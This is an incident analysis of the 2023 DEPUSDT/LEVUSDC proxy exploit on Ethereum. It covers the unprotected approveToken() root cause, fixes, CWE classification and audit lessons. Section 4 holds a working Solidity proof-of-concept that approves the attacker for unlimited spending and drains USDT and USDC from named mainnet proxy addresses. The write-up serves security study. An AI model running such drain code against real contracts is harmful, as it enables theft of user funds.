# DEPUSDT/LEVUSDC — Proxy Approval Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-09 |
| **Protocol** | DEPUSDT / LEVUSDC (Leverage Tokens) |
| **Chain** | Ethereum |
| **Loss** | ~36K (LEVUSDC) + ~69K (DEPUSDT) = ~105K USD |
| **Attacker** | Unknown |
| **Attack Tx DEPUSDT** | [0xf0a13b44...](https://etherscan.io/tx/0xf0a13b445674094c455de9e947a25bade75cac9f5176695fca418898ea25742f) |
| **Attack Tx LEVUSDC** | [0x800a5b31...](https://etherscan.io/tx/0x800a5b3178f680feebb81af69bd3dff791b886d4ce31615e601f2bb1f543bb2e) |
| **Vulnerable Contract** | [0x7b190a92...](https://etherscan.io/address/0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f) (DEPUSDT Proxy) |
| **Root Cause** | No access control on the proxy contract's `approveToken()` function |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/DEPUSDT_LEVUSDC_exp.sol) |

---
## 1. Vulnerability Overview

The DEPUSDT and LEVUSDC leverage token proxy contracts implement an `approveToken(address token, address pool, uint256 amount)` function with no access control. Anyone can grant unlimited approval to an arbitrary address over tokens held by the proxy contract, allowing an attacker to drain all proxy assets.

## 2. Vulnerable Code Analysis

```solidity
// ❌ approveToken with no access control
interface IProxy {
    // ❌ No onlyOwner — callable by anyone
    function approveToken(address token, address pool, uint256 amount) external;
}

// Proxy implementation (inferred)
contract LeverageProxy {
    // ❌ No access control
    function approveToken(address token, address pool, uint256 amount) external {
        // Approves tokens held by the proxy to an arbitrary address
        IERC20(token).approve(pool, amount);
    }
}
```

```solidity
// ✅ Fix: Add access control
contract LeverageProxy is Ownable {
    // ✅ Only callable by onlyOwner
    function approveToken(address token, address pool, uint256 amount) external onlyOwner {
        IERC20(token).approve(pool, amount);
    }
}
```

### On-Chain Source Code

Source: Bytecode decompilation

```solidity
// Root cause: No access control on the proxy contract's `approveToken()` function
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌──────────────────────────────────────────────┐
│  1. proxy.approveToken(USDT, attacker, MAX)  │
│     ❌ No access control → unlimited approval granted     │
└──────────────────────────────┬───────────────┘
                               ▼
┌──────────────────────────────────────────────┐
│  2. USDT.transferFrom(proxy, attacker, all)  │
│     → All proxy-held assets drained             │
└──────────────────────────────────────────────┘
  (Same attack applied to both DEPUSDT proxy and LEVUSDC proxy)
```

## 4. PoC Code

```solidity
function testExploit() public {
    // Attack DEPUSDT proxy
    IProxy depProxy = IProxy(0x7b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f);

    // 1. Grant unlimited approval of proxy-held USDT to attacker
    depProxy.approveToken(address(usdt), address(this), type(uint256).max);

    // 2. Use approval to drain all USDT
    uint256 proxyBalance = usdt.balanceOf(address(depProxy));
    usdt.transferFrom(address(depProxy), address(this), proxyBalance);

    // Same attack on LEVUSDC proxy
    IProxy levProxy = IProxy(0x2a2b195558cf89aa617979ce28880bbf7e17bc45);
    levProxy.approveToken(address(usdc), address(this), type(uint256).max);
    usdc.transferFrom(address(levProxy), address(this), usdc.balanceOf(address(levProxy)));
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Missing access control on approveToken | CRITICAL | CWE-284 | 03_access_control.md |
| V-02 | Unauthorized approval of proxy assets | CRITICAL | CWE-862 | 03_access_control.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Restrict calls to admin only
modifier onlyAdmin() {
    require(msg.sender == admin, "Not admin");
    _;
}
function approveToken(address token, address pool, uint256 amount) external onlyAdmin {
    IERC20(token).approve(pool, amount);
}
```

## 7. Lessons Learned

1. Administrative functions on proxy contracts (`approve`, `transfer`, `setOwner`) must always enforce strict access control.
2. When auditing contracts that hold assets, token approval-related functions among all public/external functions should be reviewed first.
3. Both LEVUSDC and DEPUSDT shared the same codebase, causing both protocols to be exploited simultaneously.